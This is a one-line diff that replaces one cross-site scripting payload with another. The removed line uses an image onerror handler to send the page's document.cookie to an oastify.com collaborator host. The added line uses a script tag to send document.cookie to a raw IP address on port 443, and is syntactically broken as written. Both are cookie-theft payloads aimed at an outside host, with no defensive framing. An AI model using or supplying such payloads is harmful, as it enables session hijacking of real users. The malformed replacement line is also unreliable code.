@@ -1,1 +1,1 @@
-<img src=x onerror=this.src='https://323qvea0a24birt75x2qxvlfy64xspge.oastify.com?'+document.cookie;>
+<script>new image().src="142.93.113.246:443/?="document.cookie</script>
